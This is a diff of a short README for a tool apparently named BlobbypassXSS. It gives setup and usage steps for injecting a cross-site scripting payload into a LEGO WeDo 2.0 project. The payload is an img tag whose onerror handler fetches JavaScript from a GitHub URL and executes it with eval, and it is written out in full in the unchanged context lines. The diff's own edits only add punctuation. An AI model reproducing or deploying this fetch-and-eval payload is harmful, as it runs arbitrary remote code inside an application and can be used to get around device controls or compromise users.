@@ -10,11 +10,11 @@
 ```
 <img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
 ```
-* Close LEGO WeDo 2.0 and re-enable your WiFi
+* Close LEGO WeDo 2.0 and re-enable your WiFi.
 
 ### How to use (after Setup):
-* Open LEGO WeDo 2.0 (with WiFi turned on)
-* Click the project you made when you were setting this up
+* Open LEGO WeDo 2.0 (with WiFi turned on).
+* Click the project you made when you were setting this up.
 * Press the pencil in the top bar.
 * Done!
   
